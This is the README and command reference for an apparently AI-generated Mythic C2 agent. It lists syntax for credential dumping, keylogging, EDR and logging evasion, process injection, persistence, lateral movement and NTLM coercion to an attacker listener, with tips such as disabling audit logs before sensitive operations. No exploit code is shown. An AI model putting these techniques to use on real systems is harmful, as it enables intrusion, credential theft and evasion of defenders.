# Fawkes Mythic C2 Agent

<img src="agent_icons/fawkes.svg" width="100" />

Fawkes is an entirely vibe-coded Mythic C2 agent. It started as an "I wonder" and has turned into a goal. My goal is to not write a single line of code for this agent, instead, exclusively producing it at a prompt.

I originally attempted to write the agent myself, but after cloning the example container, reading through mythic docs, watching the dev series youtube videos, and copying code from other agents like Merlin or Freyja, I decided I just didn't have time to develop my own agent. A prompt though, that I have time for.

Fawkes is a golang based agent with cross-platform capabilities. It supports **Windows** (EXE, DLL, and shellcode payloads), **Linux** (ELF binaries and shared libraries), and **macOS** (Mach-O binaries for Intel and Apple Silicon). **212 commands** total: 112 cross-platform, 82 Windows-only, 21 Unix-only, 11 Linux-only, and 6 macOS-only (some commands have platform-specific implementations sharing one user-facing name, e.g. screenshot). Supports HTTP egress and TCP peer-to-peer (P2P) linking for internal pivoting.

## Installation
To install Fawkes, you'll need Mythic installed on a remote computer. You can find installation instructions for Mythic at the [Mythic project page](https://github.com/its-a-feature/Mythic/).

From the Mythic install directory:

```
./mythic-cli install github https://github.com/galoryber/fawkes
```

## Commands Quick Reference

Command | Syntax | Description
------- | ------ | -----------
acl-edit | `acl-edit -action read -server dc01 -target user` | Read/modify Active Directory object DACLs (add/remove ACEs, grant DCSync, GenericAll, backup/restore). Cross-platform (T1222.001, T1098, T1003.006).
adcs | `adcs -action <cas\|templates\|find\|request> -server <DC> -username <user@domain> -password <pass> [-ca_name <CA>] [-template <name>] [-alt_name <UPN>]` | Enumerate AD Certificate Services, find vulnerable templates (ESC1-ESC4, ESC6 via DCOM), and request certificates via DCOM for ESC1/ESC6 exploitation. Cross-platform (T1649).
ads | `ads -action <write\|read\|list\|delete> -file <path> [-stream <name>] [-data <content>] [-hex true]` | **(Windows only)** Manage NTFS Alternate Data Streams — write, read, list, or delete hidden data streams. Supports text and hex-encoded binary. MITRE T1564.004.
amcache | `amcache -action <query\|search\|delete\|clear> [-name <pattern>] [-count <n>]` | **(Windows only)** Query and clean Windows Shimcache (AppCompatCache) execution history. Removes forensic evidence of tool execution (T1070.004).
apc-injection | `apc-injection` | **(Windows only)** Perform QueueUserAPC injection into an alertable thread. Use `ts` to find alertable threads (T1055.004).
auditpol | `auditpol -action <query\|disable\|enable\|stealth> [-category <name\|all>]` | **(Windows only)** Query and modify Windows audit policies. Disable security event logging before sensitive operations. Stealth mode disables detection-critical subcategories. Uses AuditQuerySystemPolicy API (T1562.002).
argue | `argue -command "cmd.exe /c whoami" -spoof "cmd.exe /c echo hello"` | **(Windows only)** Execute a command with spoofed process arguments. Defeats Sysmon Event ID 1 and EDR command-line telemetry (T1564.010).
arp | `arp [-ip <subnet>] [-mac <prefix>] [-interface <name>]` | Display ARP table with optional IP, MAC, or interface filtering. Cross-platform.
asrep-roast | `asrep-roast -server <DC> -username <user@domain> -password <pass> [-account <target>]` | Request AS-REP tickets for accounts without pre-authentication and extract hashes in hashcat format for offline cracking. Auto-enumerates via LDAP. Cross-platform (T1558.004).
av-detect | `av-detect [-deep true]` | Detect installed AV/EDR/security products by scanning running processes against a 130+ signature database. With `--deep`, also checks kernel modules, systemd units, and config directories for installed-but-not-running products (Linux). Reports product, vendor, type, and PID. Cross-platform.
autopatch | `autopatch <dll_name> <function_name> <num_bytes>` | **(Windows only)** Automatically patch a function by jumping to nearest return (C3) instruction. Useful for AMSI/ETW bypasses.
base64 | `base64 -action <encode\|decode> -input <string_or_file> [-file true] [-output <path>]` | Encode/decode base64 for strings and files. File I/O support for encoding binaries and decoding to disk. Cross-platform (T1132.001).
bits | `bits -action <list\|create\|persist\|cancel\|suspend\|resume\|complete> [-name <job>] [-url <URL>] [-path <local>] [-command <exe>]` | **(Windows only)** Manage BITS transfer jobs for persistence and stealthy file download. Create, suspend, resume, complete jobs and set notification commands for persistence. Jobs survive reboots (T1197).
browser | `browser [-action <passwords\|cookies\|history\|autofill\|bookmarks\|downloads>] [-browser <all\|chrome\|edge\|chromium\|firefox>]` | Harvest browser data from Chromium-based browsers and Firefox. History, autofill, bookmarks, and downloads are cross-platform. Passwords and cookies use DPAPI decryption (Windows only). Firefox cookies on all platforms. MITRE T1555.003, T1217.
cat | `cat <file>` or `cat -path <file> -start N -end N -number true` | Display file contents with optional line range, numbering, and 5MB size protection.
cd | `cd <directory>` | Change the current working directory.
chmod | `chmod -path <file> -mode <permissions> [-recursive true]` | Modify file/directory permissions with octal (755, 644) or symbolic (+x, u+rw, go-w) notation. Recursive support. Cross-platform (T1222).
chown | `chown -path <file> -owner <user> [-group <group>] [-recursive true]` | **(Linux/macOS only)** Change file/directory ownership by username/UID and group name/GID. Recursive support (T1222).
cert-check | `cert-check -host <hostname> [-port 443] [-timeout 10]` | Inspect TLS certificates on remote hosts — identifies CAs, self-signed certs, expiry, SANs, TLS version, cipher suites, and SHA256 fingerprints. Cross-platform (T1590.001).
certstore | `certstore -action <list\|find> [-store <MY\|ROOT\|CA\|Trust\|TrustedPeople>] [-filter <substring>]` | **(Windows only)** Enumerate Windows certificate stores to find code signing certs, client auth certs, and private keys. Searches CurrentUser and LocalMachine. MITRE T1552.004, T1649.
clipboard | `clipboard -action <read\|write\|monitor\|dump\|stop> [-data "text"] [-interval 3]` | Read/write clipboard or continuously monitor for changes with credential pattern detection. Cross-platform (T1115).
cloud-metadata | `cloud-metadata -action <detect\|all\|creds\|identity\|userdata\|network> [-provider <auto\|aws\|azure\|gcp\|digitalocean>] [-timeout 3]` | Probe cloud instance metadata services for IAM credentials, identity, user-data, and network config. Auto-detects provider. AWS IMDSv2 support. Cross-platform (T1552.005, T1580).
compress | `compress -action <create\|list\|extract> -path <path> [-output <out>] [-pattern *.txt]` | Create, list, or extract zip archives for data staging and exfiltration. Pattern filter, depth/size limits. Cross-platform (T1560.001).
coerce | `coerce -server <target> -listener <attacker-ip> [-method petitpotam\|printerbug\|shadowcoerce\|all] -username <user> [-password <pass>] [-hash <NT hash>] [-domain <domain>]` | NTLM authentication coercion via MS-EFSR (PetitPotam), MS-RPRN (PrinterBug), MS-FSRVP (ShadowCoerce). Forces target to authenticate to attacker listener. Pass-the-hash support. Cross-platform (T1187).
config | `config [-action show\|set] [-key sleep\|jitter\|killdate\|working_hours_start\|working_hours_end\|working_days] [-value <val>]` | View or modify runtime agent configuration — sleep, jitter, kill date, working hours. Cross-platform.
container-detect | `container-detect` | Detect container runtime and environment (Docker, K8s, LXC, Podman, WSL). Checks escape vectors like Docker sockets and K8s service accounts. Cross-platform (T1082, T1497.001).
container-escape | `container-escape -action <check\|docker-sock\|cgroup\|nsenter\|mount-host> [-command '<cmd>']` | **(Linux only)** Container breakout — Docker socket abuse, cgroup release_agent, PID namespace nsenter, host device mount. Enumerate or exploit escape vectors (T1611).
cp | `cp <source> <destination>` | Copy a file from source to destination.
cred-check | `cred-check -hosts <IPs/CIDRs> -username <DOMAIN\user> -password <pass> [-hash <NTLM>] [-timeout <seconds>]` | Test credentials against SMB, WinRM, and LDAP on target hosts. Validates authentication across protocols in parallel with PTH support. Cross-platform (T1110.001, T1078).
cred-harvest | `cred-harvest -action <shadow\|cloud\|configs\|history\|windows\|m365-tokens\|all> [-user <username>]` | Harvest credentials: shadow hashes (Unix), cloud configs (AWS/GCP/Azure/K8s), application secrets, shell history scanning for leaked passwords/tokens/API keys, PowerShell history + env vars + RDP (Windows), M365 OAuth/JWT tokens from TokenBroker/Teams/Outlook (Windows). Cross-platform (T1552, T1003.008, T1528).
credential-prompt | `credential-prompt [-title "Authentication Required"] [-message "Enter your credentials..."] [-icon caution]` | Display native credential dialog to capture user credentials. macOS: AppleScript dialog with custom icon. Windows: CredUI prompt (domain/user/password). Linux: zenity/kdialog/yad. Reports to Mythic credential vault (T1056.002).
curl | `curl -url <URL> [-method GET\|POST\|PUT\|DELETE\|HEAD\|OPTIONS\|PATCH] [-headers '{"K":"V"}'] [-body <data>] [-output full\|body\|headers]` | Make HTTP/HTTPS requests from agent's network. Cloud metadata, internal services, SSRF. Cross-platform (T1106).
cut | `cut -path <file> -delimiter <char> -fields <1,3\|1-3\|2-> [-chars <1-10>]` | Extract fields or character ranges from file lines. Custom delimiters, range specs. Cross-platform (T1083).
credman | `credman [-action <list\|dump>] [-filter <pattern>]` | **(Windows only)** Enumerate Windows Credential Manager entries. `list` shows metadata, `dump` reveals passwords. MITRE T1555.004.
defender | `defender -action <status\|exclusions\|add-exclusion\|remove-exclusion\|threats\|enable\|disable> [-type <path\|process\|extension>] [-value <val>]` | **(Windows only)** Manage Defender — status, exclusions, threats, enable/disable real-time protection. MITRE T1562.001.
dpapi | `dpapi -action <decrypt\|masterkeys\|chrome-key> [-blob <base64>] [-entropy <base64>]` | **(Windows only)** DPAPI blob decryption (CryptUnprotectData), master key enumeration, Chrome/Edge encryption key extraction. MITRE T1555.003/T1555.005.
email | `email -action <count\|search\|read\|folders> [-folder <name>] [-query <keyword>] [-index <n>]` | **(Windows only)** Access Outlook mailbox via COM. Count messages, search by keyword, read by index, list folders. MITRE T1114.001.
dcom | `dcom -action exec -host <target> -command <cmd> [-args <arguments>] [-object mmc20\|shellwindows\|shellbrowser]` | **(Windows only)** Execute commands on remote hosts via DCOM lateral movement. Three objects: MMC20.Application, ShellWindows, ShellBrowserWindow. MITRE T1021.003.
debug-detect | `debug-detect` | Detect attached debuggers, analysis tools, and instrumentation. Windows: IsDebuggerPresent, NtQueryInformationProcess, PEB, DR registers. Linux: TracerPid, LD_PRELOAD, memory maps (Frida/Valgrind/sanitizers), VM/sandbox. macOS: sysctl P_TRACED, DYLD_INSERT_LIBRARIES, VM detection (sysctl), security products (EDR/AV), sandbox/analysis env. All: debugger process scan (T1497.001).
dcsync | `dcsync -server <DC> -username <user> [-password <pass>] [-hash <NT hash>] -target <account[,account2]>` | DCSync — replicate AD credentials via DRS without touching LSASS. Extracts NTLM hashes, Kerberos keys (AES256/AES128). Supports pass-the-hash. Cross-platform (T1003.006).
df | `df [-filesystem <device>] [-mount_point <path>] [-fstype <type>]` | Report filesystem disk space usage with optional device, mount point, or fstype filtering. Cross-platform (T1082).
diff | `diff -file1 <path> -file2 <path> [-context <n>]` | Compare two files and show differences in unified diff format. LCS-based algorithm with configurable context lines. Cross-platform (T1083).
dns | `dns -action <resolve\|reverse\|srv\|mx\|ns\|txt\|cname\|all\|dc\|zone-transfer\|wildcard> -target <host> [-server <dns_ip>]` | DNS enumeration — resolve hosts, query records, discover DCs, zone transfers, wildcard detection. Cross-platform (T1018).
du | `du -path <file_or_dir> [-max_depth <n>]` | Report disk usage for files and directories. Size breakdown by subdirectory, sorted by largest. Cross-platform (T1083).
drivers | `drivers [-filter <name>]` | Enumerate loaded kernel drivers/modules. Windows: EnumDeviceDrivers, Linux: /proc/modules, macOS: kext enumeration. Cross-platform (T1082).
domain-policy | `domain-policy -action <all\|password\|lockout\|fgpp> -server <DC> -username <user@domain> -password <pass>` | AD password/lockout policy and FGPP enumeration via LDAP. Spray-safe recommendations. Cross-platform (T1201).
crontab | `crontab -action <list\|add\|remove> [-entry <cron_line>] [-program <path>] [-schedule <schedule>]` | **(Linux/macOS only)** List, add, or remove cron jobs for persistence. Supports raw cron entries or program+schedule syntax.
download | `download <path>` | Download a file or directory from the target. Directories are auto-zipped and downloaded as `.zip`. Chunked transfer, file browser integration.
drives | `drives` | List available drives/volumes and mounted filesystems with type, label/device, and free/total space.
enum-tokens | `enum-tokens [-action list\|unique] [-user <filter>]` | **(Windows only)** Enumerate access tokens across all processes. `list` shows PID/user/integrity/session for each process. `unique` groups by user with process counts. Auto-enables SeDebugPrivilege (T1134, T1057).
encrypt | `encrypt -action <encrypt\|decrypt> -path <file> [-output <out>] [-key <base64key>]` | AES-256-GCM file encryption/decryption for secure data staging. Auto-generates key or accepts provided key. Cross-platform (T1560.001).
env | `env [-action <list\|get\|set\|unset>] [-name <VAR>] [-value <val>] [-filter <pattern>]` | List, get, set, or unset environment variables for the agent process. Changes are inherited by child processes. Cross-platform.
env-scan | `env-scan [-pid <PID>] [-filter <pattern>]` | Scan process environment variables for leaked credentials, API keys, and secrets. 35+ detection patterns across cloud, database, CI/CD, and crypto categories. Linux + macOS (T1057, T1552.001).
etw | `etw -action <sessions\|providers\|stop\|blind\|query\|enable> [-session_name <name>] [-provider <guid\|shorthand>]` | **(Windows only)** Enumerate, stop, blind, query, or re-enable ETW trace sessions and providers. `blind` disables a provider; `enable` restores it; `query` shows session details. Shorthands: sysmon, amsi, powershell, dotnet, winrm, kernel-process, etc. (T1082, T1562.002, T1562.006).
eventlog | `eventlog -action <list\|query\|clear\|info\|enable\|disable> [-channel <name\|unit\|subsystem\|path>] [-event_id <id>] [-filter <xpath\|keyword\|timewindow>] [-count <max>]` | Manage system event logs. Windows: wevtapi.dll channels. Linux: journald units and syslog files. macOS: Unified Logging (os_log) subsystems/processes. List sources, query events, clear/vacuum logs, get info. MITRE T1070.001, T1562.002.
execute-memory | `execute-memory -arguments 'arg1 arg2' -timeout 60` | Execute a native binary from memory. Linux: memfd_create (no disk write). macOS: temp file with ad-hoc codesign. Windows: temp file with immediate cleanup. All platforms remove artifacts after execution. MITRE T1620.
execute-shellcode | `execute-shellcode` | **(Windows only)** Execute shellcode in the current process via VirtualAlloc + CreateThread. No cross-process injection — runs in a new thread within the agent (T1059.006).
exit | `exit` | Task agent to exit.
file-attr | `file-attr -path <file> [-attrs "+hidden,-readonly,+immutable"]` | Get or set file attributes — hidden, readonly, system (Windows); immutable, append, nodump (Linux); hidden, immutable (macOS). Omit -attrs to view current flags. Cross-platform (T1564.001, T1222).
file-type | `file-type -path <file_or_dir> [-recursive true] [-max_files 100]` | Identify file types by magic bytes (35+ signatures). Single file or directory scanning. Detects executables, archives, documents, images, databases, media, and more. Cross-platform (T1083).
find | `find -pattern <glob> [-path <dir>] [-min_size <bytes>] [-max_size <bytes>] [-newer <min>] [-older <min>] [-type f\|d] [-perm suid\|sgid\|writable\|executable\|<octal>] [-owner <user\|uid>]` | Search for files by name, size, date, permissions, or owner. Find SUID binaries, world-writable files, files owned by specific users. Cross-platform (T1083).
find-admin | `find-admin -hosts <targets> -username <user> -password <pass> [-method smb\|winrm\|both] [-hash <NT>]` | Sweep hosts to discover where credentials have admin access via SMB (C$ share) and/or WinRM. Supports CIDR, IP ranges, PTH, parallel scanning (T1021.002, T1021.006).
firewall | `firewall -action <list\|add\|delete\|enable\|disable\|status> [-name <rule>] [-direction <in\|out>] [-protocol <tcp\|udp\|any>] [-port <port>]` | **(Windows, macOS, Linux)** Manage firewall rules. Windows: COM API. macOS: ALF + pf. Linux: iptables/nftables (auto-detected) with list/add/delete/status. MITRE T1562.004.
getprivs | `getprivs -action list\|enable\|disable\|strip [-privilege <name>]` | **(Windows, macOS, Linux)** List privileges/capabilities. Windows: token privileges with enable/disable/strip. Linux: process capabilities (CapEff/CapPrm) + SELinux/AppArmor context. macOS: entitlements, sandbox, groups (T1134.002).
getsystem | `getsystem [-technique steal]` | **(Windows only)** Elevate to SYSTEM by stealing a token from a SYSTEM process (winlogon.exe). Requires admin/SeDebugPrivilege (T1134.001).
gpp-password | `gpp-password -server <DC> -username <user@domain> -password <pass>` | Search SYSVOL for GPP XML files with encrypted cpassword attributes and decrypt using the published AES key (MS14-025). Cross-platform via SMB (T1552.006).
gpo | `gpo -action <list\|links\|find\|all> -server <DC> -username <user@domain> -password <pass> [-filter <name>]` | Enumerate Group Policy Objects via LDAP — list GPOs, map links with enforcement, find interesting CSE settings. Cross-platform (T1615).
grep | `grep -pattern <regex> [-path <dir>] [-extensions .txt,.xml] [-ignore_case] [-max_results 100]` | Search file contents for regex patterns. Recursive directory search with extension filtering, context lines, and binary file skipping. Cross-platform (T1083, T1552.001).
hash | `hash -path <file_or_dir> [-algorithm md5\|sha1\|sha256\|sha512] [-recursive true] [-pattern *.exe] [-max_files 500]` | Compute file hashes (MD5, SHA-1, SHA-256, SHA-512). Single files or directories with glob pattern filtering and depth control. Cross-platform (T1083).
hexdump | `hexdump -path <file> [-offset <bytes>] [-length <bytes>]` | Display file contents in xxd-style hex+ASCII format. Offset/length control for examining specific regions, max 4096 bytes. Cross-platform (T1005).
handles | `handles -pid <pid> [-type File] [-show_names] [-max_count 500]` | **(Windows, Linux, macOS)** Enumerate open handles/file descriptors in a process. Windows: NtQuerySystemInformation. Linux: /proc/pid/fd. macOS: lsof (T1057, T1082).
hashdump | `hashdump [-format json]` | **(Windows, Linux, macOS)** Extract local account password hashes. Windows: NTLM hashes from SAM registry (requires SYSTEM). Linux: /etc/shadow hashes with hash-type identification (requires root). macOS: Directory Services PBKDF2 hashes from user plists (requires root). MITRE T1003.002, T1003.008.
history-scrub | `history-scrub [-action list\|clear\|clear-all] [-user <username>]` | List or clear shell/application command history files. Covers bash, zsh, fish, PowerShell, python, mysql, and more. Cross-platform (T1070.003).
hollow | `hollow -filename <shellcode> [-target <process>] [-ppid <pid>] [-block_dlls true]` | **(Windows only)** Process hollowing — create suspended process, write shellcode, redirect thread via SetThreadContext. PPID spoofing + DLL blocking. MITRE T1055.012.
ide-recon | `ide-recon -action <vscode\|jetbrains\|all> [-user <filter>]` | Enumerate IDE configurations — VS Code extensions, remote SSH hosts, recent projects, settings with secrets. JetBrains data sources, deployment servers, recent projects. Cross-platform (T1005, T1083).
ifconfig | `ifconfig` | List network interfaces with addresses, MAC, MTU, and flags. Cross-platform (Windows/Linux/macOS).
inline-assembly | `inline-assembly` | **(Windows only)** Execute a .NET assembly in memory using the CLR. Supports command-line arguments. Use `start-clr` first for AMSI patching workflow.
inline-execute | `inline-execute` | **(Windows only)** Execute a Beacon Object File (BOF/COFF) in memory. Supports all argument types: strings (z), wide strings (Z), integers (i), shorts (s), and binary (b).
reflective-load | `reflective-load -dll_b64 <base64_dll> [-function <export>]` | **(Windows only)** Load a native PE (DLL) from memory into the current process. Manual PE mapping with section copying, relocation fixups, import resolution, and DllMain invocation. Optionally call exported functions (T1620).
iptables | `iptables -action <status\|rules\|nat\|add\|delete\|flush> [-rule <args>] [-table <name>]` | **(Linux only)** Linux firewall enumeration and management via iptables/nftables/ufw. IP forwarding, connection tracking, rule listing and modification. MITRE T1562.004.
jobkill | `jobkill -id <task-uuid>` | Stop a running task by task ID. Use `jobs` to list running tasks. Cross-platform.
jobs | `jobs` | List currently running tasks with task ID, command name, and duration. Cross-platform.
jxa | `jxa -code '<script>' [-timeout 60]` or `jxa -file /path/to/script.js` | **(macOS only)** Execute JavaScript for Automation (JXA) scripts with ObjC bridge access to Foundation, AppKit, Security frameworks. Supports inline code and file input (T1059.007).
kerberoast | `kerberoast -server <DC> -username <user@domain> -password <pass> [-spn <SPN>]` | Request TGS tickets for SPN accounts and extract hashes in hashcat format for offline cracking. Auto-enumerates via LDAP. Cross-platform (T1558.003).
klist | `klist -action <list\|purge\|dump\|import> [-server <filter>] [-ticket <base64>] [-path <path>]` | Enumerate, dump, purge, and import Kerberos tickets. Import enables Pass-the-Ticket: Windows injects kirbi via LSA, Linux/macOS writes ccache + sets KRB5CCNAME. Cross-platform (T1558, T1550.003).
keychain | `keychain -action <list\|dump\|find-password\|find-internet\|find-cert> [-service <name>] [-server <host>]` | **(macOS only)** Access macOS Keychain — list keychains, dump metadata, find generic/internet passwords, enumerate certificates.
kerb-delegation | `kerb-delegation -action <all\|unconstrained\|constrained\|rbcd> -server <DC> -username <user@domain> -password <pass>` | Enumerate Kerberos delegation relationships — unconstrained, constrained (with protocol transition), RBCD. Detects sensitive accounts. Cross-platform (T1550.003).
keylog | `keylog -action <start\|stop\|dump\|status\|clear>` | Low-level keyboard logger. Windows: SetWindowsHookEx with window context. Linux: /dev/input evdev (requires root/input group). Status checks state/buffer size. Clear resets buffer without stopping (T1056.001).
lateral-check | `lateral-check -hosts <IPs/CIDRs> [-timeout <seconds>]` | Test lateral movement options against targets — checks SMB, WinRM, RDP, RPC, SSH connectivity and suggests applicable methods. Cross-platform (T1046, T1021).
last | `last [-count 25] [-user <username>]` | Show recent login history. Linux: parses utmp/wtmp. Windows: queries Security event log (4624). macOS: native `last` command. Cross-platform (T1087.001).
ldap-query | `ldap-query -action <users\|computers\|groups\|domain-admins\|spns\|asrep\|admins\|disabled\|gpo\|ou\|password-never-expires\|trusts\|unconstrained\|constrained\|dacl\|query> -server <DC>` | Query Active Directory via LDAP. Preset queries for users, computers, groups, domain admins, all admins (adminCount), SPNs, AS-REP roastable, disabled accounts, GPOs, OUs, password-never-expires, domain trusts, unconstrained/constrained delegation, DACL analysis, or custom LDAP filters. Cross-platform (T1087.002, T1482).
ldap-write | `ldap-write -action <add-member\|remove-member\|set-attr\|add-attr\|remove-attr\|set-spn\|disable\|enable\|set-password\|shadow-cred\|clear-shadow-cred> -server <DC> -target <obj>` | Modify AD objects via LDAP. Group membership, attributes, SPNs, account enable/disable, password reset, shadow credentials (msDS-KeyCredentialLink). Cross-platform (T1098, T1556.006).
kill | `kill -pid <PID>` | Terminate a process by PID. Cross-platform (Windows/Linux/macOS).
laps | `laps -server <DC> -username <user@domain> -password <pass> [-filter <computer>]` | Read LAPS passwords from AD via LDAP. Supports LAPS v1 (ms-Mcs-AdmPwd) and Windows LAPS v2 (ms-LAPS-Password). Cross-platform (T1552.006).
lsa-secrets | `lsa-secrets -action <dump\|cached>` | **(Windows only)** Extract LSA secrets (service passwords, DPAPI keys, machine account) and cached domain credentials (DCC2/MSCacheV2 hashcat format). Requires SYSTEM (T1003.004, T1003.005).
launchagent | `launchagent -action <install\|remove\|list> -label <com.example.name> [-path <exe>] [-daemon true]` | **(macOS only)** Install, remove, or list LaunchAgent/LaunchDaemon persistence. Creates plist with RunAtLoad+KeepAlive.
link | `link -host <ip> -port <port>` | Link to a TCP P2P agent for internal pivoting. Target agent must be built with TCP profile. Cross-platform (T1572).
ln | `ln -target <existing> -link <new> [-symbolic true] [-force true]` | Create symbolic or hard links. Symlinks can point to non-existent paths. Force mode replaces existing link. Cross-platform (T1036).
linux-logs | `linux-logs -action <list\|read\|logins\|clear\|truncate\|shred> [-file <path>] [-search <filter>] [-lines <n>]` | **(Linux only)** List, read, clear, or tamper with Linux log files and binary login records (wtmp/btmp/utmp). Supports selective line removal and secure shredding (T1070.002).
logonsessions | `logonsessions [-action list\|users] [-filter <name>]` | **(Windows, Linux, macOS)** Enumerate active logon sessions — users, session IDs, stations, connection state. Filter by username. Windows: WTS API. Linux: utmp parsing. macOS: utmpx parsing.
ls | `ls [path]` | List files and folders with owner/group and timestamps. File browser integration. Defaults to cwd.
make-token | `make-token -username <user> -domain <domain> -password <pass> [-logon_type <type>]` | **(Windows only)** Create a token from credentials and impersonate it.
mkdir | `mkdir <directory>` | Create a new directory (creates parent directories if needed).
module-stomping | `module-stomping -pid <PID> [-dll_name <DLL>]` | **(Windows only)** Inject shellcode by stomping a legitimate DLL's .text section. Shellcode executes from signed DLL address space, bypassing private-memory detection (T1055.001).
modules | `modules [-pid <PID>] [-filter <name>]` | List loaded modules/DLLs/libraries in a process with optional name filtering. Cross-platform (T1057).
mem-scan | `mem-scan -pid <PID> -pattern <string> [-hex] [-max_results <n>] [-context_bytes <n>]` | Search process memory for byte patterns with hex dump output. Windows: VirtualQueryEx/ReadProcessMemory. Linux: /proc/pid/maps+mem. Supports string and hex patterns (T1005, T1057).
mount | `mount [-filter <substring>] [-fstype <type>]` | List mounted filesystems with device, mount point, type, and options. Supports filtering by name or filesystem type. Cross-platform (T1082).
mv | `mv <source> <destination>` | Move or rename a file from source to destination.
named-pipes | `named-pipes [-filter <pattern>]` | **(Windows, Linux, macOS)** List named pipes (Windows), Unix domain sockets and FIFOs (Linux/macOS) for IPC discovery. Supports substring filtering (T1083).
net-enum | `net-enum -action <users\|localgroups\|groupmembers\|admins\|domainusers\|domaingroups\|domaininfo\|loggedon\|sessions\|shares\|mapped> [-target <host>] [-group <name>]` | **(Windows only)** Unified Windows network enumeration via Win32 API. Users, local/domain groups, group members, logged-on users (T1033), SMB sessions (T1049), shares (T1135), mapped drives, domain info. Supports remote hosts via -target.
net-group | `net-group -action <list\|members\|user\|privileged> -server <DC> [-group <name>] [-user <sAMAccountName>] -username <user@domain> -password <pass>` | Enumerate AD group memberships via LDAP. Recursive member resolution, user group lookup, privileged group enumeration. Cross-platform (T1069.002).
net-user | `net-user -action <add\|delete\|info\|password\|group-add\|group-remove> -username <name> [-password <pass>] [-group <group>]` | Manage local user accounts and group membership. Windows: netapi32 API. Linux: useradd/userdel/usermod/chpasswd. macOS: dscl/dseditgroup. Cross-platform (T1136.001, T1098).
net-stat | `net-stat [-state <LISTEN\|ESTABLISHED\|...>] [-proto <tcp\|udp>] [-port <number>] [-pid <number>]` | List active network connections and listening ports with protocol, state, PID, and process name. Supports filtering by state, protocol, port, and process ID. Cross-platform.
ntdll-unhook | `ntdll-unhook [-action unhook\|check]` | **(Windows only)** Remove EDR inline hooks from ntdll.dll by restoring the .text section from a clean on-disk copy. `check` reports hooks without removing them (T1562.001).
syscalls | `syscalls [-action status\|list\|init]` | **(Windows only)** Indirect syscall resolver. Parses ntdll exports to resolve Nt* syscall numbers and generates stubs that jump to ntdll's syscall;ret gadget. When active, injection commands bypass userland API hooks (T1106).
opus-injection | `opus-injection` | **(Windows only)** Callback-based process injection. Variant 1: Ctrl-C Handler Chain. Variant 4: PEB KernelCallbackTable. [Details](research/injection-techniques.md#opus-injection)
persist | `persist -method <registry\|startup-folder\|com-hijack\|screensaver\|ifeo\|list> -action <install\|remove>` | **(Windows only)** Install or remove persistence via registry Run keys, startup folder, COM hijacking (T1546.015), screensaver hijacking (T1546.002), or IFEO debugger (T1546.012). IFEO targets accessible from lock screen (sethc, utilman, osk).
persist-enum | `persist-enum [-category <all\|platform-specific>]` | **(Windows, Linux, macOS)** Read-only enumeration of persistence mechanisms. Windows: registry, startup, tasks, services. Linux: cron, systemd, shell profiles, SSH keys, LD_PRELOAD, udev rules, kernel modules, motd, at jobs, D-Bus services, PAM modules, package hooks, logrotate scripts, NetworkManager dispatcher, anacron. macOS: LaunchAgents, login items, periodic scripts, auth plugins, emond, at jobs (T1547, T1546, T1053, T1543, T1556).
password-managers | `password-managers [-depth <N>]` | Discover password manager databases and config files — KeePass (.kdbx), 1Password, Bitwarden, LastPass, Dashlane, KeePassXC. Cross-platform (T1555).
poolparty-injection | `poolparty-injection` | **(Windows only)** Inject shellcode using PoolParty techniques that abuse Windows Thread Pool internals. All 8 variants supported. [Details](research/injection-techniques.md#poolparty-injection)
ping | `ping -hosts <IP/CIDR/range> [-port 445] [-timeout 1000] [-threads 25]` | TCP connect host reachability check with subnet sweep. Supports CIDR, dash ranges, and comma-separated lists. Cross-platform (T1018).
pipe-server | `pipe-server -action <check\|impersonate> [-name <pipe>] [-timeout 30]` | **(Windows only)** Named pipe impersonation for privilege escalation. Create pipe server, wait for privileged client connection, impersonate token. Requires SeImpersonatePrivilege (T1134.001).
printspoofer | `printspoofer [-timeout 15]` | **(Windows only)** PrintSpoofer privilege escalation — SeImpersonate to SYSTEM via Print Spooler. Creates named pipe, triggers spooler connection via OpenPrinterW, impersonates SYSTEM token. One-step NETWORK SERVICE → SYSTEM (T1134.001).
pkg-list | `pkg-list [-filter <substring>]` | List installed packages and software. Enumerates dpkg/rpm/apk (Linux), Homebrew/Applications (macOS), or registry Uninstall keys (Windows). Supports name filtering. Cross-platform (T1518).
port-scan | `port-scan -hosts <IPs/CIDRs> [-ports <ports>] [-timeout <s>]` | TCP connect scan for network service discovery. Supports CIDR, IP ranges, and port ranges. Cross-platform.
powershell | `powershell <command> [--encoded]` | **(Windows only)** Execute a PowerShell command via powershell.exe with OPSEC-hardened flags (abbreviated, randomized). Supports encoded command mode to hide args from process tree.
prefetch | `prefetch -action <list\|parse\|delete\|clear> [-name <exe>] [-count <max>]` | **(Windows only)** Parse and manage Windows Prefetch files. List executed programs, parse run history (up to 8 timestamps), delete specific entries, or clear all. Supports MAM-compressed files (T1070.004).
privesc-check | `privesc-check -action <all\|privileges\|services\|registry\|uac\|...>` | Privilege escalation enumeration. Windows: token privileges, unquoted services, AlwaysInstallElevated, auto-logon, UAC, unattend files. Linux: SUID/SGID, capabilities, sudo, containers, cron hijacking, NFS no_root_squash, systemd units, sudo tokens, PATH hijacking, docker group, dangerous groups, Polkit rules, modprobe hooks. macOS: LaunchDaemons, TCC, dylib hijacking, SIP. Cross-platform (T1548, T1574.009).
psexec | `psexec -host <target> -command <cmd> [-name <svcname>] [-cleanup <true\|false>]` | **(Windows only)** Execute commands on remote hosts via SCM service creation — PSExec-style lateral movement. MITRE T1021.002, T1569.002.
proc-info | `proc-info -action <info\|connections\|mounts\|modules> [-pid <PID>]` | **(Linux only)** Deep /proc inspection: process details (cmdline, env, caps, cgroups, namespaces, FDs), network connections with PID resolution, mounts, kernel modules. MITRE T1057.
process-mitigation | `process-mitigation [-action query\|set] [-pid <PID>] [-policy <policy>]` | **(Windows only)** Query or set process mitigation policies (DEP, ASLR, CIG, ACG, CFG). Set CIG to block unsigned DLL loading (EDR defense). MITRE T1480.
process-tree | `process-tree [-pid <PID>] [-filter <name>]` | Display process hierarchy as a tree with parent-child relationships. Helps identify injection targets and security tools. Cross-platform (T1057).
procdump | `procdump [-action lsass\|dump\|search] [-pid <PID>]` | Dump process memory. Windows: MiniDumpWriteDump with LSASS auto-discovery. Linux: /proc/pid/mem region dumping. Search action finds credential-holding processes. Uploads to Mythic and cleans from disk. MITRE T1003.001, T1003.007.
proxy-check | `proxy-check [-test_url <URL>]` | Detect proxy settings from environment variables, OS config (registry, config files), and Go transport. Optional connectivity test. Cross-platform (T1016).
ps | `ps [-filter <name>] [-pid <PID>] [-ppid <PPID>] [-user <name>] [-v]` | List running processes with Mythic process browser integration. Filter by name, PID, parent PID, or username. Cross-platform.
